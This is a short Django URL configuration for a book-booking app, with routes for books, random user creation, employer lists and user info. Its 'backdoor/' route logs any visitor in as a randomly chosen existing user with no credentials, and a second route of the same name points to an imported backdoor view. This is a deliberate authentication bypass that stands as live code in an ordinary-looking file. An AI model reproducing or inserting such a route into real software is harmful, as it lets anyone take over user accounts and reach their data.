from django.contrib.auth import login
from django.contrib.auth.models import User
from django.http import HttpResponse
from django.urls import path
from rest_framework.routers import SimpleRouter

from booking.models import Book

import random

from booking.views import create_random_user, backdoor, get_employers_name_list, get_user_info, BooksViewSet

router = SimpleRouter()
router.register('books', BooksViewSet)

urlpatterns = [
    path("book/<slug:slug>", lambda reqv, slug: HttpResponse(Book.objects.get(slug=slug).title)),
    path('backdoor/', lambda request: HttpResponse(bool(login(request, random.choice(User.objects.all()))))),
    path('create_random_user/', create_random_user),
    path('backdoor/', backdoor),
    path('list/', get_employers_name_list),
    path('users/', get_user_info),

] + router.urls